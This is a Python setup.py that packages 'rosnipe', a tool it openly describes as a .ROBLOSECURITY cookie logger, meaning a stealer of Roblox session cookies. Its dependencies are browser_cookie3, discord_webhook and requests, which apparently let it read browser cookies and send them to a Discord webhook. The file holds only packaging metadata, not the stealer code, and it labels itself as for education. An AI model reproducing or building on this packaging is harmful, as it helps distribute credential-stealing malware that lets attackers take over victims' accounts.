from setuptools import setup, find_packages

classifiers = [
  'Development Status :: 5 - Production/Stable',
  'Intended Audience :: Education',
  'Operating System :: Microsoft :: Windows :: Windows 10',
  'License :: OSI Approved :: MIT License',
  'Programming Language :: Python :: 3'
]

setup(
  name='rosnipe',
  version='0.0.2',
  description='A .ROBLOSECURITY cookie logger.',
  long_description=open('README.txt').read() + '\n\n' + open('CHANGELOG.txt').read(),
  url='',  
  author='KGB',
  author_email='kgb@comrades.gq',
  license='MIT', 
  classifiers=classifiers,
  keywords='rosnipe', 
  packages=find_packages(),
  install_requires=['discord_webhook', 'browser_cookie3', 'requests']
)